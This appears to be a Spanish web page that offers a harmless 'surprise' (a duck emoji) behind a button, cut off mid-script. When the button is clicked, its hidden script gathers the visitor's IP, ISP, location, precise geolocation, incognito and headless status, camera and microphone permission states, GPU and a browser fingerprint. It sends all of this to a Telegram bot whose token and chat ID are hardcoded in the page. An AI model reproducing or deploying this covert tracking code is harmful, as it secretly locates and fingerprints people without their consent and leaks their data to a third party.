<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Test</title>
  <style>
    body {
      font-family: Arial;
      padding: 20px;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      cursor: pointer;
      border: none;
      background-color: #4CAF50;
      color: white;
      border-radius: 6px;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #45a049;
    }
    .duck {
      font-size: 64px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Aprieta el bot칩n para una sorpresa/h2>
    <button id="startBtn">sorpresa</button>
    <div class="duck" id="duck" style="display: none;">游붅</div>
  </div>

<script>
(() => {
  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
  const CHAT_ID = "6065284869";

  const startBtn = document.getElementById("startBtn");
  const duckEl = document.getElementById("duck");

  let humanInteraction = false;
  ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
    window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
  });

  function detectHeadless() {
    return (/HeadlessChrome/.test(navigator.userAgent) ||
            !navigator.plugins?.length ||
            !navigator.languages?.length ||
            navigator.webdriver)
      ? "S칤" : "No";
  }

  async function detectIncognito() {
    return new Promise(resolve => {
      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
      if (!fs) resolve("No detectable");
      else fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("S칤"));
    });
  }

  function getFingerprint() {
    return btoa([
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      navigator.hardwareConcurrency || "n/a",
      Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a"
    ].join('|'));
  }

  async function checkPermissions() {
    if (!navigator.permissions) return "No soportado";
    try {
      const cam = await navigator.permissions.query({name:"camera"});
      const mic = await navigator.permissions.query({name:"microphone"});
      const geo = await navigator.permissions.query({name:"geolocation"});
      return `C치mara: ${cam.state}, Micr칩fono: ${mic.state}, Geoloc: ${geo.state}`;
    } catch {
      return "Error consulta permisos";
    }
  }

  function checkHardwareAcceleration() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "No WebGL";
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (!dbg) return "No debug info";
      return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "No renderer";
    } catch {
      return "Error WebGL";
    }
  }

  async function detectAdblock() {
    try {
      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",  {method:"HEAD", mode:"no-cors"});
      return "No detectado";
    } catch {
      return "Probable AdBlock";
    }
  }

  function checkTimezoneLocale() {
    try {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const lang = navigator.language || navigator.userLanguage;
      if (lang.startsWith('es') && tz.startsWith('UTC')) return "Discrepancia detectada";
      return "OK";
    } catch {
      return "No disponible";
    }
  }

  async function getIPInfo() {
    try {
      const res = await fetch("https://ipapi.com/ip_api.php");  
      if (!res.ok) throw new Error("No response");
      return await res.json();
    } catch {
      return null;
    }
  }

  async function sendToTelegram(message) {
    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;  
      const response = await fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });
      const data = await response.json();
      console.log("Telegram response:", data);
    } catch(e) {
      console.warn("Error enviando a Telegram:", e);
    }
  }

  async function collectAndSend() {
    startBtn.disabled = true;
    startBtn.textContent = "Enviando...";

    const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
      getIPInfo(),
      new Promise((res, rej) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 3000});
        } else rej();
      }),
      detectIncognito(),
      checkPermissions(),
      detectAdblock()
    ]);

    let message = "";

    if (ipRes.status === "fulfilled" && ipRes.value) {
      const ip = ipRes.value;
      message += `IP: ${ip.query}
ISP: ${ip.org}
ASN: ${ip.as?.asn || "n/a"}
Proxy/VPN/Tor: ${ip.is_proxy ? "S칤" : "No"}
Ciudad: ${ip.city}
Regi칩n: ${ip.regionName}
Pa칤s: ${ip.country}
Versi칩n IP: IPv${ip.ip_version}
\n`;
    } else {
